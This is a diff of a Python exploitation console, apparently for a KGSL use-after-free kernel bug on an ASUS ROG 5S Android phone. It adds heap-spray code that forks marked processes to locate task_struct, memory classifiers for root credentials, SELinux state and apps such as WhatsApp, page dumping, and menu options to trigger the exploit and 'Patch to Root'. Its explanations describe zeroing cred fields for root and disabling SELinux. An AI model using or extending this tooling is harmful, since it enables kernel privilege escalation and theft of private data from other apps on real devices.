@@ -18,27 +18,41 @@ class MemoryExplorerAI:
         self.uaf_start = 0x7001ff000
         self.uaf_size = 0x10000000 # 256MB
         
-        # AI Heuristics Database
+        # AI Heuristics Database - Expanded System Signatures
         self.system_signatures = {
-            "com.android.settings": "Android Settings (Security)",
-            "com.android.systemui": "System UI (Core)",
-            "com.android.camera": "Camera Driver Context",
-            "com.android.gallery3d": "Gallery Media Service",
-            "com.android.deskclock": "System Clock / Alarm",
-            "com.android.contacts": "Contacts Database",
-            "com.google.android.gms": "Google Play Services",
-            "com.asus.launcher": "ASUS Launcher (Shell)",
-            "ru.rustore.sdk": "RuStore SDK Instance",
-            "system_server": "Kernel System Server",
-            "surfaceflinger": "Display Compositor"
+            "com.android.settings": "Android Settings (Security & Dev Mode)",
+            "com.android.systemui": "System UI (Core Interface)",
+            "com.android.camera": "Camera Hardware Driver Context",
+            "com.android.gallery3d": "Gallery Media & Photo Service",
+            "com.android.deskclock": "System Clock, Alarms & Timers",
+            "com.android.contacts": "Contacts Database & Phonebook",
+            "com.android.calculator2": "System Calculator App",
+            "com.android.mms": "SMS/MMS Messaging Service",
+            "com.android.phone": "Telephony & Call Management",
+            "com.google.android.gms": "Google Play Services (Core API)",
+            "com.asus.launcher": "ASUS Launcher (System Shell)",
+            "system_server": "Kernel System Server (Core Logic)",
+            "surfaceflinger": "SurfaceFlinger (Display Compositor)",
+            "android.uid.system": "System-wide UID 1000 Context"
+        }
+
+        # User Installed App Signatures
+        self.user_signatures = {
+            "com.android.vending": "Google Play Store (Official)",
+            "ru.rustore.sdk": "RuStore SDK Instance (Third-party)",
+            "com.apple.movetoios": "Move to iOS (App Store Utility)",
+            "com.whatsapp": "WhatsApp Messenger (User Data)",
+            "com.instagram.android": "Instagram (User Data)"
         }
         
         self.kernel_signatures = {
-            b"KETO0422": "task_struct (Exploit Marker)",
-            b"init_cred": "Global Root Credentials",
-            b"selinux_enforcing": "SELinux Enforcing State",
-            b"\x7fELF": "Kernel Binary (ELF Header)",
-            b"\xfd\x7b\xbf\xa9": "AArch64 Function Prologue"
+            b"KETO0422": "task_struct (Process Control Block)",
+            b"init_cred": "Global Root Credentials (init_cred)",
+            b"selinux_enforcing": "SELinux Enforcing State (Global)",
+            b"selinux_status": "SELinux Kernel Status Bit",
+            b"\x7fELF": "Kernel Executable Base (ELF Header)",
+            b"\xfd\x7b\xbf\xa9": "AArch64 Function Prologue (Code)",
+            b"\xff\xff\xff\xff\xff\xff\xff\xff": "Kernel Pointer Alignment Area"
         }
 
     def get_ram_usage(self):
@@ -69,33 +83,35 @@ class MemoryExplorerAI:
         """
         AI Heuristic Engine: Classifies memory content based on weights
         """
-        score = 0.0
-        best_guess = {"type": "Raw Data", "desc": "Unknown Memory Region", "conf": 0.0}
-
-        # 1. Check for String Signatures (System Apps)
-        for sig, name in self.system_signatures.items():
-            if sig.encode() in page_data:
-                return {"type": "System App", "desc": name, "conf": 1.0, "data": page_data, "va": hex(va)}
-
-        # 2. Check for Kernel Markers
+        # 1. Check for Kernel Core Markers
         for sig, name in self.kernel_signatures.items():
             if sig in page_data:
-                return {"type": "Kernel Core", "desc": name, "conf": 0.95, "data": page_data, "va": hex(va)}
+                return {"type": "Kernel Core", "desc": name, "conf": 0.98, "data": page_data, "va": hex(va)}
 
-        # 3. Check for UID/GID patterns (UID 1000 = system)
+        # 2. Check for System Apps (System-wide signatures)
+        for sig, name in self.system_signatures.items():
+            if sig.encode() in page_data:
+                return {"type": "System App", "desc": name, "conf": 0.95, "data": page_data, "va": hex(va)}
+
+        # 3. Check for User Installed Apps
+        for sig, name in self.user_signatures.items():
+            if sig.encode() in page_data:
+                return {"type": "User App", "desc": name, "conf": 0.90, "data": page_data, "va": hex(va)}
+
+        # 4. Check for UID/GID patterns (UID 1000 = system)
         uid_pattern = struct.pack("<IIII", 1000, 1000, 1000, 1000)
         if uid_pattern in page_data:
-            return {"type": "Privilege Struct", "desc": "System Credentials (UID 1000)", "conf": 0.85, "data": page_data, "va": hex(va)}
+            return {"type": "Privilege Struct", "desc": "System-level Credentials (UID 1000)", "conf": 0.85, "data": page_data, "va": hex(va)}
 
-        # 4. Check for AArch64 Code Patterns
-        if b"\xfd\x7b" in page_data[:128]: # Common stack frame setup
-            return {"type": "Executable", "desc": "AArch64 Code Segment", "conf": 0.70, "data": page_data, "va": hex(va)}
+        # 5. Check for AArch64 Code Patterns (Low-level disassembly hints)
+        if b"\xfd\x7b" in page_data[:128]: 
+            return {"type": "Binary Logic", "desc": "AArch64 Executable Machine Code", "conf": 0.80, "data": page_data, "va": hex(va)}
 
-        return {"type": "Data", "desc": "Random Buffer / Cache", "conf": 0.1, "data": page_data, "va": hex(va)}
+        return {"type": "Unknown Object", "desc": "Unclassified Data Fragment", "conf": 0.05, "data": page_data, "va": hex(va)}
 
     def translate_logic(self, item):
         """
-        AI Translation: Explains the bytes in human words
+        AI Deep Logic Translation: Merges bytes into human-readable descriptions.
         """
         data = item['data']
         desc = item['desc']
@@ -103,41 +119,77 @@ class MemoryExplorerAI:
         if "task_struct" in desc:
             pid_off = 0x548
             pid = struct.unpack("<I", data[pid_off:pid_off+4])[0] if len(data) > pid_off+4 else 0
-            return f"This is a Process Descriptor for PID {pid}. It contains pointers to CPU registers, stack, and security credentials (cred)."
-        elif "cred" in desc or "Credentials" in desc:
-            uid = struct.unpack("<I", data[4:8])[0] if len(data) > 8 else -1
-            return f"Security Credentials structure. Current UID is {uid}. Patching the first 32 bytes to zero will grant full ROOT permissions."
-        elif "ELF" in desc:
-            return "Kernel Image Header. This is the 'Base' of the operating system code. Useful for calculating offsets for all other functions."
-        elif "Settings" in desc:
-            return "Android Settings process memory. Likely contains developer mode flags, ADB status, and security policy caches."
-        elif "Code" in desc:
-            return "Executable machine code. These are instructions for the CPU. Can be modified to hijack program flow (Function Hooking)."
+            return (f"This is the Process Control Block (task_struct) for process ID {pid}. "
+                    "It acts as the central hub for the process, storing its execution state, "
+                    "memory mappings, and security context. The 'cred' pointer located here "
+                    "defines who the process is in the eyes of the kernel.")
         
-        return "Generic memory buffer. Contains unstructured data used by system services or applications."
+        elif "init_cred" in desc or "Credentials" in desc:
+            uid = struct.unpack("<I", data[4:8])[0] if len(data) > 8 else -1
+            return (f"Security Credentials Structure (struct cred). Currently assigned UID: {uid}. "
+                    "This object governs all permission checks (SELinux, filesystem, networking). "
+                    "By merging the UID/GID fields to zero (Root), the associated process will "
+                    "gain absolute control over the Android operating system.")
+        
+        elif "SELinux" in desc:
+            val = data[0] if len(data) > 0 else -1
+            status = "Enforcing (Locked)" if val == 1 else "Permissive (Open)"
+            return (f"Security-Enhanced Linux (SELinux) Global State. Current mode: {status}. "
+                    "This is the primary shield of Android. Disabling this bit allows the "
+                    "execution of arbitrary code that would normally be blocked by security policies.")
+        
+        elif "ELF" in desc:
+            return ("Kernel Executable Header (ELF). This is the absolute starting point of the "
+                    "Linux Kernel in memory. It contains the entry point for system boot and "
+                    "serves as the reference for calculating all relative function addresses (KASLR).")
+        
+        elif "System App" in item['type']:
+            return (f"Memory region belonging to the {desc}. This area contains runtime strings, "
+                    "API call buffers, and possibly sensitive user data managed by the system UI.")
+        
+        elif "User App" in item['type']:
+            return (f"Private data segment for a user-installed application ({desc}). "
+                    "This region may contain cached login tokens, user preferences, or "
+                    "app-specific binary logic that can be explored for further analysis.")
+        
+        elif "Machine Code" in desc:
+            return ("Raw AArch64 machine instructions. These bytes represent the low-level "
+                    "logic executed by the ARM CPU. Analyzing these can reveal the function's "
+                    "purpose, such as system call handling or security verification routines.")
+        
+        return "Generic data fragment. No clear logical pattern detected by the heuristic engine."
 
     def render_tui(self):
         os.system('clear')
         ram = self.get_ram_usage()
-        print("="*85)
-        print(f" KGSL AI MEMORY EXPLORER | Status: {'ACTIVE' if self.exploit_proc else 'IDLE'} | RAM: {ram:.1f}%")
-        print("="*85)
+        print("╔" + "═"*83 + "╗")
+        print(f"║ KGSL AI MEMORY EXPLORER & CLASSIFIER (ROG 5S)        │ STATUS: {'ACTIVE':<7} │ RAM: {ram:>4.1f}% ║")
+        print("╠" + "═"*83 + "╣")
         
-        print(" [FILE MANAGER VIEW] - Memory Regions Found:")
-        print("-" * 85)
-        print(f" {'ID':<3} | {'TYPE':<18} | {'IDENTIFIED AS':<35} | {'VA ADDRESS':<12}")
-        print("-" * 85)
-        
+        # Categorized view
+        categories = {"Kernel Core": [], "System App": [], "User App": [], "Privilege Struct": [], "Other": []}
         for i, item in enumerate(self.found_items):
-            print(f" [{i:02d}] | {item['type']:<18} | {item['desc']:<35} | {item['va']:<12}")
+            cat = item['type'] if item['type'] in categories else "Other"
+            categories[cat].append((i, item))
+
+        print("║ [ROOT]                                                                            ║")
+        for cat, items in categories.items():
+            if not items: continue
+            print(f"║  ├── [{cat}]                                                                    ║")
+            for idx, item in items:
+                # Truncate desc for display
+                desc = (item['desc'][:30] + '..') if len(item['desc']) > 32 else item['desc']
+                line = f"│   └── ID:{idx:02d} | {desc:<32} | VA:{item['va']:<12} | Conf:{item['conf']*100:>3.0f}%"
+                print(f"║  {line:<81} ║")
         
         if not self.found_items:
-            print(f" {'(No items found yet. Trigger [E] and Scan [S] to populate)':^80}")
+            print(f"║  {'--- NO MEMORY OBJECTS DETECTED ---':^81} ║")
+            print(f"║  {'Trigger Exploit [E] and AI Scan [S] to start mapping':^81} ║")
             
-        print("\n" + "="*85)
-        print(" [E] Exploit Trigger   [P] Spray Markers   [S] Start AI Scan   [C] Clear Memory")
-        print(" [R] Verify Root       [B] Rebuild Engine  [Q] Exit Explorer   [ID] Open File")
-        print("="*85)
+        print("╠" + "═"*83 + "╣")
+        print("║ [E] Exploit Trigger   [P] Slow Spray   [S] Start AI Scan   [C] Clear Memory Cache ║")
+        print("║ [R] Check Identity    [B] Build Engine [Q] Exit Explorer   [ID] Open Object       ║")
+        print("╚" + "═"*83 + "╝")
 
     def show_detail(self, idx):
         if idx >= len(self.found_items): return
@@ -146,26 +198,43 @@ class MemoryExplorerAI:
         
         while True:
             os.system('clear')
-            print(f"=== [FILE VIEW: {item['va']}] ===")
-            print(f" Classification: {item['type']}")
-            print(f" Identification: {item['desc']} (Confidence: {item['conf']*100:.1f}%)")
-            print("-" * 75)
+            print("┌" + "─"*83 + "┐")
+            print(f"│ MEMORY OBJECT EXPLORER - VA: {item['va']:<50} │")
+            print("├" + "─"*83 + "┤")
+            print(f"│ [CLASS]: {item['type']:<20} | [DESC]: {item['desc']:<43} │")
+            print(f"│ [CONFIDENCE]: {item['conf']*100:>5.1f}%          | [SIZE]: {len(data):>5} bytes                            │")
+            print("├" + "─"*83 + "┤")
             
-            print(" [AI LOGIC TRANSLATION]:")
-            print(f" >> {self.translate_logic(item)}")
-            print("-" * 75)
+            print("│ AI LOGIC INTERPRETATION:                                                          │")
+            wrapped_logic = self.translate_logic(item)
+            # Simple wrapping for TUI
+            for i in range(0, len(wrapped_logic), 80):
+                line = wrapped_logic[i:i+80]
+                print(f"│ >> {line:<79} │")
+            print("├" + "─"*83 + "┤")
             
-            print(" [BIOS-STYLE HEX/BINARY DUMP]:")
-            for i in range(0, min(len(data), 128), 16):
+            print("│ BIOS-STYLE LOW-LEVEL HEX & BINARY DATA:                                           │")
+            print("│ ADDR |  00 01 02 03 04 05 06 07  08 09 0A 0B 0C 0D 0E 0F | BINARY (BYTE 0-3)       │")
+            print("│" + "-"*83 + "│")
+            
+            for i in range(0, min(len(data), 256), 16):
                 chunk = data[i:i+16]
-                hex_str = " ".join(f"{b:02X}" for b in chunk)
-                # Binary for first 4 bytes of each line
-                b_val = struct.unpack("<I", chunk[:4])[0]
+                hex_row = " ".join(f"{b:02X}" for b in chunk)
+                if len(chunk) < 16:
+                    hex_row += "   " * (16 - len(chunk))
+                
+                # Binary for first 4 bytes
+                b_val = struct.unpack("<I", chunk[:4])[0] if len(chunk) >= 4 else 0
                 bin_str = bin(b_val)[2:].zfill(32)
-                print(f" {i:04X}: {hex_str:<48} | BIN: {bin_str[:8]}...")
+                
+                # Format hex row with a space in the middle
+                hex_parts = hex_row.split(" ")
+                hex_f = " ".join(hex_parts[:8]) + "  " + " ".join(hex_parts[8:])
+                
+                print(f"│ {i:04X} | {hex_f:<48} | {bin_str[:8]}.{bin_str[8:16]}.{bin_str[16:24]}.{bin_str[24:]} │")
             
-            print("-" * 75)
-            print(" [P] Patch to Root    [N] Scan Neighbors    [Enter] Back to List")
+            print("└" + "─"*83 + "┘")
+            print(" [P] Patch to Root    [N] Scan Neighbors    [D] Dump to File    [Enter] Back")
             
             choice = input("\n explorer > ").lower()
             if not choice: break
@@ -173,8 +242,24 @@ class MemoryExplorerAI:
                 self.patch_to_root(int(item['va'], 16))
                 input("Press Enter...")
             elif choice == 'n':
-                print("[*] Reading adjacent memory...")
-                # Logic for neighbors here...
+                print("[*] AI: Analyzing adjacent memory segments for structural links...")
+                base_va = int(item['va'], 16)
+                # Scan 2 pages before and 2 pages after
+                for offset in [-8192, -4096, 4096, 8192]:
+                    n_va = base_va + offset
+                    n_data = self.read_page(n_va)
+                    if n_data and any(b != 0 for b in n_data):
+                        n_item = self.classify_page(n_data, n_va)
+                        n_item['desc'] = f"(Linked to {item['va']}) " + n_item['desc']
+                        self.found_items.append(n_item)
+                        print(f"[+] Found related object at {hex(n_va)}")
+                time.sleep(1)
+                break # Return to list to see new items
+            elif choice == 'd':
+                fname = f"dump_{item['va']}.bin"
+                with open(fname, "wb") as f:
+                    f.write(data)
+                print(f"[+] Dumped to {fname}")
                 time.sleep(1)
 
     def patch_to_root(self, va):
@@ -213,19 +298,34 @@ class MemoryExplorerAI:
                 break
         time.sleep(1)
 
-    def run_spray(self, count=3000):
-        print(f"[*] Creating {count} Process Markers for AI recognition...")
+    def run_spray(self, count=2000):
+        print(f"[*] AI: Initiating controlled spray of {count} process markers...")
+        print("[*] Speed: SLOW (Throttled for stability)")
+        
         for i in range(count):
+            if i % 100 == 0:
+                # Monitor RAM during spray
+                ram = self.get_ram_usage()
+                if ram > 65.0:
+                    print(f"\n[!] AI Safety: RAM at {ram:.1f}%. Throttling spray...")
+                    time.sleep(2)
+            
             pid = os.fork()
             if pid == 0:
                 try:
                     import ctypes
                     libc = ctypes.CDLL(None)
+                    # Set a unique marker name for AI recognition
                     libc.prctl(15, f"KETO{i:04d}".encode(), 0, 0, 0)
                 except: pass
+                # Keep process alive but idle
                 while True: time.sleep(100)
-            else: self.spray_procs.append(pid)
-        print(f"[+] Memory Spraying complete.")
+            else: 
+                self.spray_procs.append(pid)
+                # Small delay to make it "not very fast"
+                time.sleep(0.005) 
+                
+        print(f"\n[+] AI: Spray complete. {len(self.spray_procs)} markers active in memory.")
         time.sleep(1)
 
     def try_compile_engine(self):
